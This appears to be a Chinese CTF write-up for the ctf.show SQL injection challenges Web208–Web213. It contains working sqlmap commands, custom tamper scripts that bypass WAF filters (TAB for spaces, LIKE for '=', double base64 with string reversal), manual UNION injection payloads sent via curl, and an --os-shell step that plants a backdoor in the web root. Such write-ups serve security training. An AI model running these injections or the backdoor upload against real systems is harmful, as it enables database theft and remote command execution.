+<h1 id="Web208"><a href="#Web208" class="headerlink" title="Web208"></a>Web208</h1><h2 id="提示-6"><a href="#提示-6" class="headerlink" title="提示"></a>提示</h2><ul>
+<li><code>--tamper</code> 的<code>2</code>体验</li>
+</ul>
+<h2 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h2><p>源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">function waf($str)&#123; return preg_match(&#x27;/ /&#x27;, $str); &#125;</span><br><span class="line">// 页面注释：$id = str_replace(&#x27;select&#x27;, &#x27;&#x27;, $id);</span><br></pre></td></tr></table></figure>
+
+<p>两个过滤叠加：</p>
+<table>
+<thead>
+<tr>
+<th>过滤</th>
+<th>绕过</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>空格</td>
+<td>&#x2F;**&#x2F;</td>
+</tr>
+<tr>
+<td>小写 select 被删除（大小写敏感）</td>
+<td>大写 SELECT 或混合 SeLeCt</td>
+</tr>
+</tbody></table>
+<h2 id="测试-7"><a href="#测试-7" class="headerlink" title="测试"></a>测试</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">B=<span class="string">&quot;https://d1eaef8f-8713-49ce-8655-86c5ea47d68d.challenge.ctf.show&quot;</span></span><br><span class="line">sqlmap -u <span class="string">&quot;<span class="variable">$B</span>/api/index.php&quot;</span> \</span><br><span class="line">  --method=PUT --data=<span class="string">&quot;id=1&quot;</span> \</span><br><span class="line">  --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> \</span><br><span class="line">  --referer=<span class="string">&quot;https://ctf.show/&quot;</span> \</span><br><span class="line">  --safe-url=<span class="string">&quot;<span class="variable">$B</span>/api/getToken.php&quot;</span> --safe-freq=1 \</span><br><span class="line">  --tamper=space2comment,uppercase \</span><br><span class="line">  --batch --tamper=space2comment,uppercase -D ctfshow_web -T ctfshow_flaxcac --dump</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="结果-4"><a href="#结果-4" class="headerlink" title="结果"></a>结果</h2><ul>
+<li>多个 <code>tamper</code> 用逗号分隔，按顺序执行</li>
+<li>可选 <code>randomcase</code> 也能绕过大小写敏感替换，但它有概率把 <code>select</code> 随机成全小写导致偶发失败；<code>uppercase</code> 更稳</li>
+<li>空的响应体（0 字节）说明 SQL 语法被破坏，不是被 WAF 拦截的 JSON 提示，排查时别搞混</li>
+<li><code>flag</code> 在 <code>ctfshow_flaxcac.flagvca</code>（表名&#x2F;字段名继续递增变化）</li>
+<li>鉴权与闭合仍沿用：一次性 <code>token</code> + <code>PUT</code> + <code>(&#39;$id&#39;) limit 0,1</code></li>
+</ul>
+<p><code>ctfshow&#123;a9114c6b-9348-4db5-a0cf-2d11e0e065d1&#125;</code></p>
+<hr>
+<h1 id="Web209"><a href="#Web209" class="headerlink" title="Web209"></a>Web209</h1><h2 id="提示-7"><a href="#提示-7" class="headerlink" title="提示"></a>提示</h2><ul>
+<li><code>--tamper</code> 的3体验</li>
+</ul>
+<h2 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h2><h3 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> waf($str)&#123; <span class="keyword">return</span> preg_match(<span class="string">&#x27;/ |\*|\=/&#x27;</span>, $str); &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>同时拦 <code>空格</code>、<code>*</code>、<code>=</code>，三样都要绕</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>被拦</th>
+<th>绕过</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>空格</td>
+<td>原始 <code>TAB (0x09)</code></td>
+</tr>
+<tr>
+<td>*</td>
+<td>不用 <code>SELECT *</code>，用显式列<code>/NULL</code></td>
+</tr>
+<tr>
+<td>&#x3D;</td>
+<td>换 <code>LIKE</code></td>
+</tr>
+</tbody></table>
+<h3 id="内置-tamper-为什么不行（实测两轮失败）："><a href="#内置-tamper-为什么不行（实测两轮失败）：" class="headerlink" title="内置 tamper 为什么不行（实测两轮失败）："></a>内置 tamper 为什么不行（实测两轮失败）：</h3><ul>
+<li><code>space2comment</code> → 输出 <code>/**/</code>，里面含 <code>*</code>，被拦</li>
+<li><code>space2mysqlblank</code> → 输出的是 <code>URL</code> 编码 <code>%09/%A0</code>；而这题服务端读原始 body、不做 URL 解码，再叠上 <code>sqlmap</code> 默认编码就成<code>%2509</code>，必挂</li>
+</ul>
+<p>关键定性实验：<code>body</code> 里发字面 %<code>09</code> 和发原始 <code>TAB</code>，后者成功、前者空响应——说明服务端不解码。</p>
+<h3 id="自写-tamper"><a href="#自写-tamper" class="headerlink" title="自写 tamper"></a>自写 tamper</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.HIGHEST</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        <span class="comment"># = 换 LIKE（避开 &gt;= &lt;= !=）</span></span><br><span class="line">        payload = re.sub(<span class="string">r&quot;\s*(?&lt;![&lt;&gt;!=])=(?!=)\s*&quot;</span>, <span class="string">&quot; LIKE &quot;</span>, payload)</span><br><span class="line">        <span class="comment"># 空格换原始 TAB</span></span><br><span class="line">        payload = payload.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;\t&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="测试-8"><a href="#测试-8" class="headerlink" title="测试"></a>测试</h2><p>脚本我放到了<code>/home/d/tools/tamper/ctfshow209.py</code>，自己测试的时候自己填。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">B=<span class="string">&quot;https://108f6fe8-669a-4be3-9748-8598d49a25d8.challenge.ctf.show&quot;</span></span><br><span class="line">sqlmap -u <span class="string">&quot;<span class="variable">$B</span>/api/index.php&quot;</span> \</span><br><span class="line">  --method=PUT --data=<span class="string">&quot;id=1&quot;</span> \</span><br><span class="line">  --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> \</span><br><span class="line">  --referer=<span class="string">&quot;https://ctf.show/&quot;</span> \</span><br><span class="line">  --safe-url=<span class="string">&quot;<span class="variable">$B</span>/api/getToken.php&quot;</span> --safe-freq=1 \</span><br><span class="line">  --tamper=/home/d/tools/tamper/ctfshow209.py \</span><br><span class="line">  --skip-urlencode \</span><br><span class="line">  --technique=U \</span><br><span class="line">  --batch --threads=1 \</span><br><span class="line">  -D ctfshow_web -T ctfshow_flav --dump</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>--skip-urlencode</code>必须加，因为按照我的绕过空格方法，不加否则 <code>TAB</code> 会被 <code>sqlmap</code> 编码成 %09 再失败。</p>
+<p>也可以尝试形如<code>space = chr(0x0d)</code>的脚本写法。</p>
+</blockquote>
+<h2 id="结果-5"><a href="#结果-5" class="headerlink" title="结果"></a>结果</h2><ul>
+<li><code>flag</code> 在 <code>ctfshow_flav.ctfshow_flagx</code></li>
+<li>用 <code>--technique=U</code> 是因为布尔&#x2F;报错 <code>payload</code> 大量含 <code>=</code>，即便 <code>tamper</code> 转换也容易踩 * 或语法问题；UNION 最稳</li>
+</ul>
+<blockquote>
+<p>手工：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl -skS -c /tmp/cj -o /dev/null -A <span class="string">&quot;sqlmap/1.10.10#stable (https://sqlmap.org)&quot;</span> \</span><br><span class="line">  -e <span class="string">&quot;https://ctf.show/&quot;</span> <span class="string">&quot;<span class="variable">$B</span>/api/getToken.php&quot;</span></span><br><span class="line">curl -skS -A <span class="string">&quot;sqlmap/1.10.10#stable (https://sqlmap.org)&quot;</span> -e <span class="string">&quot;https://ctf.show/&quot;</span> \</span><br><span class="line">  -b /tmp/cj -X PUT -H <span class="string">&quot;Content-Type: text/plain&quot;</span> \</span><br><span class="line">  --data-binary $<span class="string">&#x27;id=0\&#x27;</span>\tUNION\tALL\tSELECT\t1,ctfshow_flagx,3\tFROM\tctfshow_flav#<span class="string">&#x27; \</span></span><br><span class="line"><span class="string">  &quot;$B/api/index.php&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+</blockquote>
+<p><code>ctfshow&#123;d46b22c0-58ad-400e-9efc-263e19ee213a&#125;</code></p>
+<hr>
+<h1 id="Web210"><a href="#Web210" class="headerlink" title="Web210"></a>Web210</h1><h2 id="提示-8"><a href="#提示-8" class="headerlink" title="提示"></a>提示</h2><ul>
+<li><code>--tamper</code> 的4体验</li>
+</ul>
+<h2 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h2><h3 id="加密链与逆运算"><a href="#加密链与逆运算" class="headerlink" title="加密链与逆运算"></a>加密链与逆运算</h3><p>服务端：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> decode($id)&#123;</span><br><span class="line">    <span class="keyword">return</span> strrev(base64_decode(strrev(base64_decode($id))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发送前要按相反顺序编码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = payload[::-<span class="number">1</span>]</span><br><span class="line">payload = base64.<span class="title function_ invoke__">b64encode</span>(payload.<span class="title function_ invoke__">encode</span>()).<span class="title function_ invoke__">decode</span>()</span><br><span class="line">payload = payload[::-<span class="number">1</span>]</span><br><span class="line">payload = base64.<span class="title function_ invoke__">b64encode</span>(payload.<span class="title function_ invoke__">encode</span>()).<span class="title function_ invoke__">decode</span>()</span><br></pre></td></tr></table></figure>
+
+<p>解码后还有两个过滤：<code>select</code> 被大小写敏感删除、<code>*</code> 被拦（<code>/**/</code>、<code>/*!50000select*/</code> 全部空响应）。</p>
+<h3 id="自写-tamper（-home-d-tools-tamper-ctfshow210-py）"><a href="#自写-tamper（-home-d-tools-tamper-ctfshow210-py）" class="headerlink" title="自写 tamper（&#x2F;home&#x2F;d&#x2F;tools&#x2F;tamper&#x2F;ctfshow210.py）"></a>自写 tamper（&#x2F;home&#x2F;d&#x2F;tools&#x2F;tamper&#x2F;ctfshow210.py）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        payload = re.sub(<span class="string">r&quot;select&quot;</span>, <span class="string">&quot;SELECT&quot;</span>, payload)   <span class="comment"># 绕过 str_replace(&#x27;select&#x27;,&#x27;&#x27;)</span></span><br><span class="line">        payload = payload[::-<span class="number">1</span>]</span><br><span class="line">        payload = base64.b64encode(payload.encode()).decode()</span><br><span class="line">        payload = payload[::-<span class="number">1</span>]</span><br><span class="line">        payload = base64.b64encode(payload.encode()).decode()</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>目录里同样需要空的 <code>__init__.py</code>。</p>
+</blockquote>
+<h2 id="测试-9"><a href="#测试-9" class="headerlink" title="测试"></a>测试</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">B=<span class="string">&quot;https://e724ffe9-5717-4f92-b1f8-aa6f713c120e.challenge.ctf.show&quot;</span></span><br><span class="line">sqlmap -u <span class="string">&quot;<span class="variable">$B</span>/api/index.php&quot;</span> \</span><br><span class="line">  --method=PUT \</span><br><span class="line">  --data=<span class="string">&quot;id=1&quot;</span> \</span><br><span class="line">  --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> \</span><br><span class="line">  --referer=<span class="string">&quot;https://ctf.show/&quot;</span> \</span><br><span class="line">  --safe-url=<span class="string">&quot;<span class="variable">$B</span>/api/getToken.php&quot;</span> \</span><br><span class="line">  --safe-freq=1 \</span><br><span class="line">  --tamper=/home/d/tools/tamper/ctfshow210.py \</span><br><span class="line">  --skip-urlencode \</span><br><span class="line">  --technique=U \</span><br><span class="line">  --batch --threads=1 \</span><br><span class="line">  -D ctfshow_web -T ctfshow_flavi --dump</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="结果-6"><a href="#结果-6" class="headerlink" title="结果"></a>结果</h2><ul>
+<li><code>sqlmap</code> 内置 <code>--base64</code> 只做单层 <code>base64</code>，这题是双层 + 两次 <code>strrev</code>，必须自写 <code>tamper</code></li>
+<li><code>--skip-urlencode</code> 不能漏：<code>base64</code> 里的 <code>+</code> &#x2F; <code>=</code> 被 URL 编码后目标不会解码</li>
+<li><code>payload</code> 里不要出现 <code>*</code>；<code>SELECT *</code> 和 <code>/**/</code> 注释都会被拦</li>
+<li><code>select</code> 改大写或双写 <code>selselectect</code> 均可（大小写敏感的 <code>str_replace</code>）</li>
+<li><code>flag</code> 在 <code>ctfshow_flavi.ctfshow_flagxx</code></li>
+</ul>
+<p><code>ctfshow&#123;a804aeb6-7585-4844-b028-6588a2587b2a&#125;</code></p>
+<hr>
+<h1 id="Web211"><a href="#Web211" class="headerlink" title="Web211"></a>Web211</h1><h2 id="提示-9"><a href="#提示-9" class="headerlink" title="提示"></a>提示</h2><ul>
+<li><code>--tamper</code> 的5体验</li>
+</ul>
+<h2 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h2><h3 id="相对上题多了什么："><a href="#相对上题多了什么：" class="headerlink" title="相对上题多了什么："></a>相对上题多了什么：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> decode($id)&#123; <span class="keyword">return</span> strrev(base64_decode(strrev(base64_decode($id)))); &#125;</span><br><span class="line"><span class="keyword">function</span> waf($str)&#123; <span class="keyword">return</span> preg_match(<span class="string">&#x27;/ /&#x27;</span>, $str); &#125;</span><br></pre></td></tr></table></figure>
+
+<p>仍然使用同一套双层 <code>base64</code> + <code>strrev</code> 编码，但 WAF 检查的是解码后的内容，并且拦截空格。关键点在于：替换空格必须在编码前做，编码后再替换就等于对 <code>base64</code> 字符串做无效替换。</p>
+<p>解码后的 <code>payload</code> 用原始 <code>TAB (0x09)</code> 代替空格，MySQL 认 TAB 为空白，WAF 只匹配字面空格。</p>
+<h3 id="自写-tamper（-home-d-tools-tamper-ctfshow211-py）"><a href="#自写-tamper（-home-d-tools-tamper-ctfshow211-py）" class="headerlink" title="自写 tamper（&#x2F;home&#x2F;d&#x2F;tools&#x2F;tamper&#x2F;ctfshow211.py）"></a>自写 tamper（&#x2F;home&#x2F;d&#x2F;tools&#x2F;tamper&#x2F;ctfshow211.py）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        payload = payload.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;\t&quot;</span>)   <span class="comment"># 编码前绕过空格过滤</span></span><br><span class="line">        payload = payload[::-<span class="number">1</span>]</span><br><span class="line">        payload = base64.b64encode(payload.encode()).decode()</span><br><span class="line">        payload = payload[::-<span class="number">1</span>]</span><br><span class="line">        payload = base64.b64encode(payload.encode()).decode()</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="测试-10"><a href="#测试-10" class="headerlink" title="测试"></a>测试</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">B=<span class="string">&quot;https://65db4c1d-0b05-4c40-9e65-34fef02d5839.challenge.ctf.show&quot;</span></span><br><span class="line">sqlmap -u <span class="string">&quot;<span class="variable">$B</span>/api/index.php&quot;</span> \</span><br><span class="line">  --method=PUT \</span><br><span class="line">  --data=<span class="string">&quot;id=1&quot;</span> \</span><br><span class="line">  --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> \</span><br><span class="line">  --referer=<span class="string">&quot;https://ctf.show/&quot;</span> \</span><br><span class="line">  --safe-url=<span class="string">&quot;<span class="variable">$B</span>/api/getToken.php&quot;</span> \</span><br><span class="line">  --safe-freq=1 \</span><br><span class="line">  --tamper=/home/d/tools/tamper/ctfshow211.py \</span><br><span class="line">  --skip-urlencode \</span><br><span class="line">  --technique=U \</span><br><span class="line">  --batch --threads=1 \</span><br><span class="line">  -D ctfshow_web -T ctfshow_flavia --dump</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="结果-7"><a href="#结果-7" class="headerlink" title="结果"></a>结果</h2><ul>
+<li>解码后带空格的 <code>payload</code> 返回的是 <code>&#123;&quot;msg&quot;:&quot;查询失败&quot;&#125;</code>，不是空响应，别当成网络问题</li>
+<li><code>--skip-urlencode</code> 仍然必须加，否则 <code>base64</code> 的 <code>+</code> &#x2F; <code>=</code> 会被编码</li>
+<li><code>flag</code> 在 <code>ctfshow_flavia.ctfshow_flagxxa</code></li>
+<li>两个 <code>tamper</code> 的区别只在“编码前做什么”：<code>web210</code> 改大小写，<code>web211</code> 换 TAB</li>
+</ul>
+<p><code>ctfshow&#123;292ad31d-10d2-4900-826f-d4fd13e86502&#125;</code></p>
+<hr>
+<h1 id="Web212"><a href="#Web212" class="headerlink" title="Web212"></a>Web212</h1><h2 id="提示-10"><a href="#提示-10" class="headerlink" title="提示"></a>提示</h2><ul>
+<li><code>--tamper</code> 的6体验</li>
+</ul>
+<h2 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h2><h3 id="和-web211-的差别"><a href="#和-web211-的差别" class="headerlink" title="和 web211 的差别"></a>和 web211 的差别</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> waf($str)&#123; <span class="keyword">return</span> preg_match(<span class="string">&#x27;/ |\*/&#x27;</span>, $str); &#125;</span><br></pre></td></tr></table></figure>
+
+<p>  只多拦了一个 <code>*</code>。编码链没变（双层 <code>base64</code> + <code>strrev</code>），所以：</p>
+<ul>
+<li><code>tamper</code> 直接复用 <code>ctfshow211.py</code>（编码前把空格换 TAB）</li>
+<li><code>payload</code> 里避开 <code>SELECT</code> <em>、<code>/**/</code>、&#x2F;</em>!50000select*&#x2F; —— <code>sqlmap</code> 的 UNION 载荷用显式列&#x2F;NULL，天然满足</li>
+<li><code>--skip-urlencode</code> 照旧</li>
+</ul>
+<p>  所以这一题不需要新写脚本。</p>
+<h2 id="测试-11"><a href="#测试-11" class="headerlink" title="测试"></a>测试</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">B=<span class="string">&quot;https://816ad04c-898c-439b-9d55-23d54cf344da.challenge.ctf.show&quot;</span></span><br><span class="line">sqlmap -u <span class="string">&quot;<span class="variable">$B</span>/api/index.php&quot;</span> \</span><br><span class="line">  --method=PUT \</span><br><span class="line">  --data=<span class="string">&quot;id=1&quot;</span> \</span><br><span class="line">  --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> \</span><br><span class="line">  --referer=<span class="string">&quot;https://ctf.show/&quot;</span> \</span><br><span class="line">  --safe-url=<span class="string">&quot;<span class="variable">$B</span>/api/getToken.php&quot;</span> \</span><br><span class="line">  --safe-freq=1 \</span><br><span class="line">  --tamper=/home/d/tools/tamper/ctfshow211.py \</span><br><span class="line">  --skip-urlencode \</span><br><span class="line">  --technique=U \</span><br><span class="line">  --batch --threads=1 \</span><br><span class="line">  -D ctfshow_web -T ctfshow_flavis --dump</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="结果-8"><a href="#结果-8" class="headerlink" title="结果"></a>结果</h2><ul>
+<li><code>flag</code> 在 <code>ctfshow_flavis.ctfshow_flagxsa</code></li>
+<li>手工验证 <code>payload</code>（解码后）：<code>0&#39;\tunion\tall\tSELECT\t1,ctfshow_flagxsa,3\tfrom\tctfshow_flavis#</code></li>
+<li>只要 <code>payload</code> 不含 <code>*</code> 和空格，这条链就能通；布尔&#x2F;时间盲注的载荷也满足，但 <code>--technique=U</code> 最省请求</li>
+</ul>
+<p><code>ctfshow&#123;aeea440b-1e85-4e80-bb2d-04dc7d96d4af&#125;</code></p>
+<hr>
+<h1 id="Web213"><a href="#Web213" class="headerlink" title="Web213"></a>Web213</h1><h2 id="提示-11"><a href="#提示-11" class="headerlink" title="提示"></a>提示</h2><ul>
+<li>练习使用<code>--os-shell</code>一键<code>getshell</code></li>
+</ul>
+<h2 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h2><h3 id="执行链"><a href="#执行链" class="headerlink" title="执行链"></a>执行链</h3><ul>
+<li>注入层与 <code>web212</code> 完全相同（双层 <code>base64+strrev</code>、<code>空格</code> &#x2F; <code>*</code> 过滤）→ 直接复用 <code>ctfshow211.py</code>           <ul>
+<li><code>--current-user = root@localhost，--is-dba = True</code></li>
+<li><code>--os-cmd=&quot;id&quot;</code>：<code>sqlmap</code> 自动遍历 <code>web</code> 根目录，在 <code>/var/www/html</code> 写入 <code>stager + backdoor</code>，回显 <code>uid=82(www-data)</code></li>
+<li><code>--os-shell</code> 交互执行：<code>find</code> 找到 <code>/tmp/flag.sh</code>，据此定位真 <code>flag</code> 在 <code>/ctfshow_flag</code></li>
+<li>退出时 <code>sqlmap</code> 自动清理上传文件，<code>ls /var/www/html</code> 复核无 <code>tmp*.php</code> 残留</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>注意：<code>/tmp/flag</code> 里是占位符 <code>flag_here</code><br>真值在 <code>/ctfshow_flag</code>——<code>/tmp/flag.sh</code> 里写着 <code>sed -i &quot;s/flag_here/$FLAG/&quot; /ctfshow_flag</code>。</p>
+</blockquote>
+<h2 id="测试-12"><a href="#测试-12" class="headerlink" title="测试"></a>测试</h2><h3 id="先确认-DBA："><a href="#先确认-DBA：" class="headerlink" title="先确认 DBA："></a>先确认 DBA：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">B=<span class="string">&quot;https://b4ad1575-8f41-43f3-87d7-9c9495721077.challenge.ctf.show&quot;</span></span><br><span class="line">sqlmap -u <span class="string">&quot;<span class="variable">$B</span>/api/index.php&quot;</span> \</span><br><span class="line">  --method=PUT --data=<span class="string">&quot;id=1&quot;</span> \</span><br><span class="line">  --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> \</span><br><span class="line">  --referer=<span class="string">&quot;https://ctf.show/&quot;</span> \</span><br><span class="line">  --safe-url=<span class="string">&quot;<span class="variable">$B</span>/api/getToken.php&quot;</span> --safe-freq=1 \</span><br><span class="line">  --tamper=/home/d/tools/tamper/ctfshow211.py --skip-urlencode \</span><br><span class="line">  --technique=U --batch --current-user --is-dba</span><br></pre></td></tr></table></figure>
+
+<h3 id="方法1：交互式-os-shell（管道喂命令）"><a href="#方法1：交互式-os-shell（管道喂命令）" class="headerlink" title="方法1：交互式 os-shell（管道喂命令）"></a>方法1：交互式 os-shell（管道喂命令）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">B=<span class="string">&quot;https://b4ad1575-8f41-43f3-87d7-9c9495721077.challenge.ctf.show&quot;</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&#x27;id\ncat /ctfshow_flag\nexit\n&#x27;</span> | sqlmap -u <span class="string">&quot;<span class="variable">$B</span>/api/index.php&quot;</span> \</span><br><span class="line">  --method=PUT --data=<span class="string">&quot;id=1&quot;</span> \</span><br><span class="line">  --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> \</span><br><span class="line">  --referer=<span class="string">&quot;https://ctf.show/&quot;</span> \</span><br><span class="line">  --safe-url=<span class="string">&quot;<span class="variable">$B</span>/api/getToken.php&quot;</span> --safe-freq=1 \</span><br><span class="line">  --tamper=/home/d/tools/tamper/ctfshow211.py --skip-urlencode \</span><br><span class="line">  --batch --os-shell --web-root=/var/www/html</span><br></pre></td></tr></table></figure>
+
+<h3 id="方法2：非交互式执行命令"><a href="#方法2：非交互式执行命令" class="headerlink" title="方法2：非交互式执行命令"></a>方法2：非交互式执行命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">B=<span class="string">&quot;https://b4ad1575-8f41-43f3-87d7-9c9495721077.challenge.ctf.show&quot;</span></span><br><span class="line">sqlmap -u <span class="string">&quot;<span class="variable">$B</span>/api/index.php&quot;</span> \</span><br><span class="line">  --method=PUT --data=<span class="string">&quot;id=1&quot;</span> \</span><br><span class="line">  --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> \</span><br><span class="line">  --referer=<span class="string">&quot;https://ctf.show/&quot;</span> \</span><br><span class="line">  --safe-url=<span class="string">&quot;<span class="variable">$B</span>/api/getToken.php&quot;</span> --safe-freq=1 \</span><br><span class="line">  --tamper=/home/d/tools/tamper/ctfshow211.py --skip-urlencode \</span><br><span class="line">  --batch --os-cmd=<span class="string">&quot;cat /ctfshow_flag&quot;</span> --web-root=/var/www/html</span><br></pre></td></tr></table></figure>
+
